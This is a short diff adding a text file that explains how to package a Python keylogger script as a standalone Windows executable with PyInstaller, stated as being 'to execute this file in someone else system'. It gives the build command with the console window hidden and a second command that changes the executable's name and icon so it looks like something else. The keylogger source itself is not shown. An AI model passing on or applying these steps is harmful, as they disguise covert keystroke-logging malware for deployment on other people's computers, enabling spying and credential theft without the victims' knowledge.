@@ -1,0 +1,7 @@
+To execute this file in someone else system First create a .exe file
+
+######This Command is used to create a .exe file for the keylogger#######
+python -m PyInstaller --onefile --windowed KeyLogger.py 
+
+This command is used to change the name and the icon of the .exe file
+python -m PyInstaller --onefile --windowed --name="NewName" --icon="icon.ico" KeyLogger.py
